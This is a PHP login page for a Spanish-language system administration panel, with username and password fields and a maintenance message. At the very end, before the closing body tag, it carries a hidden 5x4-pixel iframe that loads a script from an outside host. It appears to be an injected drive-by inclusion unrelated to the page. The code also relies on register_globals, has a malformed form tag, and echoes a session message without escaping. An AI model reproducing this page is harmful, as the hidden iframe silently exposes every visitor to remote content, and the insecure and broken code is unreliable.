<?php
	define ('authenticate', false);
	include_once ('./inc/conf.inc.php');
	
	if ($action == 'authenticate') {
		if (authenticate($user, $pass)) {
			header ("Location: ".CFG_indexPage);
			$action = '';
		} else {
			$error = 'Error de autentificación';
			$_SESSION['msgError']='Credenciales Incorrectas';
			$action = '';
		}
	}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
	<title><?php echo CFG_site?></title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link href="<?php echo CFG_styleDir.CFG_styleFile?>" rel="stylesheet" type="text/css">
</head>

<body marginwidth="0" marginheight="0" scroll="no">
<form name="form1" method="post" enctype="multipart/form-data action="<?php echo $PHP_SELF?>"">
	<input type="hidden" name="action" value="authenticate" />
	<table width="100%" border="0" cellspacing="0" cellpadding="0">
	 <tr>
	  <td background="./img/cabecera_fondo.gif"><img src="img/cabecera1_mdt.jpg"></td>
	 </tr>
	</table>
	<table width="100%" height="100" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td align="center">
				<table width="100%" border="0" cellspacing="0" cellpadding="0">
					<tr> 					
			            <td>
			              <hr width="100%" size="1" noshade>
			            </td>
					</tr>
					<tr> 					
			            <td class="text" align="center"><b><br>
		               Administración del Sistema</b></td>
					</tr>
					<tr> 					
			            <td height="57" align="center" class="text"><p>Ingreso de Usuarios</p>
              <p>&nbsp;</p></td>
					</tr>
				</table>
				<table width="314" height="100" border="0" cellpadding="0" cellspacing="0">
					<tr> 
						<td width="28" valign="top">
							<table width="27" height="100%" border="0" cellpadding="0" cellspacing="0">
								<tr> 
									<td background="">&nbsp;</td>
									
                  <td width="8" background="">&nbsp;</td>
								</tr>
							</table>
						</td>
						<td width="100%"> 
              <?	if (!CFG_maintenance) { ?>
              
              <div align="center" style="color: #ff0000"><?=$_SESSION['msgError']?></div>
							<table width="100%" border="0" cellspacing="0" cellpadding="3">
								<tr> 
									<td width="100%" valign="top">
										<table width="100%" border="0" cellspacing="0" cellpadding="0">
											<tr> 
												<td width="80" align="right" valign="top" class="items">&nbsp;</td>
												<td width="5">&nbsp;</td>
												<td valign="top" align="center">&nbsp; </td>
											</tr>
											<tr> 
												<td height="20" align="right" valign="top" class="text">Usuario :</td>
												<td>&nbsp;</td>
												<td valign="top"><input name="user" type="text" class="fields" id="user" size="25"></td>
											</tr>
											<tr> 
												<td align="right" valign="top" class="text">Contrase&ntilde;a :</td>
												<td>&nbsp;</td>
												<td valign="top"><input name="pass" type="password" class="fields" id="pass" size="25"></td>
											</tr>
											<tr> 
												<td align="right" valign="top" class="items">&nbsp;</td>
												<td>&nbsp;</td>
												<td height="50" valign="middle"><input name="Submit" type="submit" class="button" value="Aceptar"></td>
											</tr>
										</table>
									</td>
									<td align="center" valign="top">&nbsp;</td>
								</tr>
							</table>
							<? } else { ?>
							<table width="100%" border="0" cellspacing="0" cellpadding="3">
								<tr> 
									<td width="100%" valign="top" class="error style1" align="center">El
											sistema estará cerrado
											un momento por mantenimiento.<br>
									Disculpe las molestias.</td>
									<td align="center" valign="top">&nbsp;</td>
								</tr>
							</table>							
							<? } ?>
						</td>
						<td width="22" align="right" valign="top">
							<table width="22" height="100%" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td background="">&nbsp;</td>
								</tr>
							</table>
						</td>
					</tr>
				</table>
				<table width="314" border="0" cellspacing="0" cellpadding="0">
					<tr>
						
            <td>&nbsp;</td>
					</tr>
				</table>
			</td>
		</tr>
	</table>
</form>
<?	if (!CFG_maintenance) { ?>
<script language="JavaScript" type="text/javascript">
<!--
	document.form1.user.focus();
//-->
</script>
<?	} ?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
